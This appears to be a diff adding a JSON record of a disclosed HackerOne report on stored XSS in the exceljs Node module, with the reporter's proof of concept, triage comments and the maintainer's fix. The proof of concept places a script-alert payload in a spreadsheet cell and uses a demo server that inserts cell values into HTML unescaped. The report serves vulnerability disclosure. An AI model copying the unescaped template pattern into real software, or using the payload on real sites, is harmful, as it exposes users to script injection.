@@ -1,0 +1,633 @@
+{
+  "id": 356809,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTY4MDk=",
+  "url": "https://hackerone.com/reports/356809",
+  "title": "[exceljs] Possible XSS via cell value when worksheet is displayed in browser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-24T13:39:32.401Z",
+  "submitted_at": "2018-05-24T13:39:32.401Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-16459"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-09-01T19:54:41.794Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-08-02T19:54:32.942Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Team,\n\nI would like to report Stored XSS vulnerability in exceljs module.\nIt allows to execute JavaScript code embeded in the XLS sheet when data from the sheet are displayed in the browser.\n\n## Module\nmodule name: exceljs\nversion: 1.4.6\nnpm page: https://www.npmjs.com/package/exceljs\n\n### Module Description\n\nRead, manipulate and write spreadsheet data and styles to XLSX and JSON.\n\nReverse engineered from Excel spreadsheet files as a project.\n\n### Module Stats\n~18k weekly downloads (estimated ~72k monthly downloads)\n\n## Vulnerability\n\n### Vulnerability Description\n```exceljs``` does not validate data from parsed XLSX file and allows to embed HTML tags, like ```<script>```, directly in the sheet cells. Because of that, I was able to craft malicious JavaScript code and execute it when data from the sheet were displayed in the browser. \n\n### Steps To Reproduce:\n\n- install exceljs\n\n```\n$ npm i exceljs\n```\n\n- create sample XLSX file (I've used LibreOffice 5.1.6.2 for Ubuntu) with the sample data. For one of the cell use the following payload:\n\n```\n<script>alert(`xss!`)</script>\n```\n\n- save the file as testsheet.xlsx\n\n\n- create sample aplication, which reads,parse and prepare HTML with content of sample XLSX file and save it as app.js:\n\n```javascript\n'use strict'\n/*global console*/\nconst Excel = require('exceljs')\nconst http = require('http')\nconst port = 8080\n\nconst workbook = new Excel.Workbook()\nconst filename = 'testsheet.xlsx'\n\nfunction createHTML(worksheet) {\n    let __html = `\n    <table>\n        <tr>\n            <td>${worksheet.getCell('A1').value}</td>\n            <td>${worksheet.getCell('A2').value}</td>\n            <td>${worksheet.getCell('A3').value}</td>\n        </tr>\n        <tr>\n            <td>${worksheet.getCell('B1').value}</td>\n            <td>${worksheet.getCell('B2').value}</td>\n            <td>${worksheet.getCell('B3').value}</td>\n        </tr>\n    </table>\n    `\n\n    return __html\n}\n\nconst requestHandler = (request, response) => {\n    workbook.xlsx.readFile(filename)\n        .then(worksheets => {\n            worksheets.eachSheet(function(worksheet, sheetId) {\n                response.writeHeader(200, {\n                    \"Content-Type\": \"text/html\"\n                })\n                response.write(createHTML(worksheet))\n                response.end()\n            });\n        });\n}\n\nconst server = http.createServer(requestHandler)\n\nserver.listen(port, (err) => {\n    if (err) {\n        return console.log(err)\n    }\n    console.log(`server is listening on ${port}`)\n})\n```\n\n- run the app\n\n```\n$ node app.js\n```\n\n- open http://localhost:8080 in the browser\n\n\n- you will notcie an alert pops up and malicious JavaScript is embeded in page source:\n\n```\n    <table>\n        <tbody><tr>\n            <td><script>alert(`xss!`)</script></td>\n            <td>test</td>\n            <td>another</td>\n        </tr>\n        <tr>\n            <td>1</td>\n            <td>2</td>\n            <td>3</td>\n        </tr>\n    </tbody></table>\n```\n\n\n## Patch\n\nI am aware that due to XLSX files complexity, an implementation of escaping HTML special characters does not resolve the problem here (because ```<```, ```>``` or ```/``` can be used in any other context in XLSX file).\n\nProbably this can be resolved by some kind of escape-on-demand data validation function passed as an optional argument to ```worksheet.getCell()``` function if no special characters are expected in returned value. Blacklisting of ```<script``` or similar well known string also might be an option, but this won't never block attacker in 100% from bypassing such protection.\n\n\n## Supporting Material/References:\n\n- Ubuntu 16.10\n- Node 8.11.1\n- npm v.6.0.1\n- Chromium 67.0.3388.0 (Developer Build) (64-bit)\n- LibreOffice Version: 5.1.6.2 Build ID: 1:5.1.6~rc2-0ubuntu1~xenial3\n\n## Wrap up\n\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nIf application displays content of the processed XLSX file in the browser, an attacker is able to craft malicious JavaScript payload which will be executed in context of user's browser",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2018-09-01T19:54:33.089Z",
+  "allow_singular_disclosure_after": -159623709.44319388,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "eveeez",
+    "rramgattie",
+    "cryptographer",
+    "mrstix"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 12359,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "exceljs",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2893932,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\n\nThanks for reporting this issue.\n\nI haven't been able to reproduce the issue, is it possible it has been fixed since the reported version and the current one that exists?\n\nI invited the package maintainer to this issue.\n",
+      "automated_response": false,
+      "created_at": "2018-06-16T12:53:16.109Z",
+      "updated_at": "2018-06-16T12:53:16.109Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2893935,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-16T12:53:22.411Z",
+      "updated_at": "2018-06-16T12:53:22.411Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2906055,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @lirantal \n\nI am on vacation right now with limited internet access, I'll check this out right after I'll be back home :)\nI am pretty sure I've got XSS in the way I've described in PoC.\n\nRegards,\n\nbl4de\n",
+      "automated_response": false,
+      "created_at": "2018-06-19T10:03:52.906Z",
+      "updated_at": "2018-06-19T10:03:52.906Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2911216,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Enjoy your time off, and ping me when you're back and we'll try to reproduce again.",
+      "automated_response": false,
+      "created_at": "2018-06-20T08:55:39.359Z",
+      "updated_at": "2018-06-20T08:55:39.359Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2914446,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-21T06:34:56.072Z",
+      "updated_at": "2018-06-21T06:34:56.072Z",
+      "additional_data": {
+        "old_severity": "Low",
+        "new_severity": "Medium (5.7)",
+        "old_severity_id": 158725,
+        "new_severity_id": 171286
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3016919,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @lirantal ,\n\nI was able to reproduce the issue, with the newest `exceljs` 1.5.1 version (information from `https://www.npmjs.com/package/exceljs` shows it was updated 13 days ago)\n\nI attach test `xlsx` file I've used to create PoC.\n\nLet me know if you still have a problem with it.\n\nbl4de",
+      "automated_response": false,
+      "created_at": "2018-07-09T11:59:58.109Z",
+      "updated_at": "2018-07-09T12:00:23.312Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 318518,
+          "filename": "testsheet.xlsx",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/318/518/e23b5f2fcc0001bc19c39f8deb02c5bf28455d4f/testsheet.xlsx?response-content-disposition=attachment%3B%20filename%3D%22testsheet.xlsx%22%3B%20filename%2A%3DUTF-8%27%27testsheet.xlsx&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074942Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=363231113b0c2e9e90cd03e22b8890aa5d276a2cfbf78469a698008657897851"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3016932,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I can see payload from `xlsx` file in output HTML:\n\n{F318519}",
+      "automated_response": false,
+      "created_at": "2018-07-09T12:02:53.872Z",
+      "updated_at": "2018-07-09T12:02:53.872Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 318519,
+          "filename": "poc.jpg",
+          "type": "image/jpeg",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/318/519/fe7224d371fe92f47d3a79d3b8854971ab7ee057/poc.jpg?response-content-disposition=attachment%3B%20filename%3D%22poc.jpg%22%3B%20filename%2A%3DUTF-8%27%27poc.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074942Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=259f1ed80ef097c57a5aaec5fd9f3b0ba95e049c467fdf2251441258e9875474"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3023019,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I was able to reproduce now with a different alert syntax, thanks!",
+      "automated_response": false,
+      "created_at": "2018-07-10T06:47:07.359Z",
+      "updated_at": "2018-07-10T06:47:07.359Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3025770,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I invited the maintainer again and also reached out to him over e-mail.\n",
+      "automated_response": false,
+      "created_at": "2018-07-10T17:52:26.468Z",
+      "updated_at": "2018-07-10T17:52:26.468Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3045635,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-07-14T20:25:58.103Z",
+      "updated_at": "2018-07-14T20:25:58.103Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "exceljs",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3045637,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-07-14T20:26:32.795Z",
+      "updated_at": "2018-07-14T20:26:32.795Z",
+      "additional_data": {
+        "old_severity": "Medium (5.7)",
+        "new_severity": "Medium (6.8)",
+        "old_severity_id": 171286,
+        "new_severity_id": 183052
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3045640,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Instead of continuing with a disclosure I'm going to try opening a GH issue to get visibility.",
+      "automated_response": false,
+      "created_at": "2018-07-14T20:26:52.662Z",
+      "updated_at": "2018-07-14T20:28:15.252Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3130105,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-08-01T20:07:45.197Z",
+      "updated_at": "2018-08-01T20:07:45.197Z",
+      "actor": {
+        "username": "guyon",
+        "cleared": false,
+        "verified": false,
+        "url": "/guyon",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3130158,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi Guys - sorry it's taken me so long to join the party.\nMy first concern is that exceljs is, for the most part, content agnostic and many installations using it will rely on this so if we were to modify the return value of the .value property it would break a lot of systems.\nThen on the other hand I can see the seriousness of this XSS attack.\n\nOne possible adjustment is to add a second property to the cell - called .html which will html-encode the value safe for rendering on a web page. Do you think this would be adequate? ",
+      "automated_response": false,
+      "created_at": "2018-08-01T20:19:32.299Z",
+      "updated_at": "2018-08-01T20:19:32.299Z",
+      "actor": {
+        "username": "guyon",
+        "cleared": false,
+        "verified": false,
+        "url": "/guyon",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3130246,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @guyon ,\n\n> One possible adjustment is to add a second property to the cell - called .html which will html-encode the value safe for rendering on a web page. Do you think this would be adequate?\n\nLooks good to me :)\n\nCheers,\n\nbl4de",
+      "automated_response": false,
+      "created_at": "2018-08-01T20:54:32.424Z",
+      "updated_at": "2018-08-01T20:54:32.424Z",
+      "actor": {
+        "username": "bl4de",
+        "cleared": false,
+        "verified": false,
+        "url": "/bl4de",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3131687,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Cool!\nI've just published v1.6.0 which includes the new .html property which will assist avoiding this XSS issue.\nThanks for your patience in getting in contact with me. You can feel free to disclose now :-)",
+      "automated_response": false,
+      "created_at": "2018-08-02T08:41:59.658Z",
+      "updated_at": "2018-08-02T08:41:59.658Z",
+      "actor": {
+        "username": "guyon",
+        "cleared": false,
+        "verified": false,
+        "url": "/guyon",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3133799,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you Guyon for the quick fix once joining the conversation, appreciate it!\nI'll go ahead with requesting a public disclosure and will give it a few days before we publicly disclose it for clients to upgrade.",
+      "automated_response": false,
+      "created_at": "2018-08-02T19:53:46.612Z",
+      "updated_at": "2018-08-02T19:53:46.612Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3133800,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-08-02T19:53:56.486Z",
+      "updated_at": "2018-08-02T19:53:56.486Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "bl4de",
+        "url": "/bl4de"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 3133803,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-08-02T19:54:32.978Z",
+      "updated_at": "2018-08-02T19:54:32.978Z",
+      "first_to_agree": true,
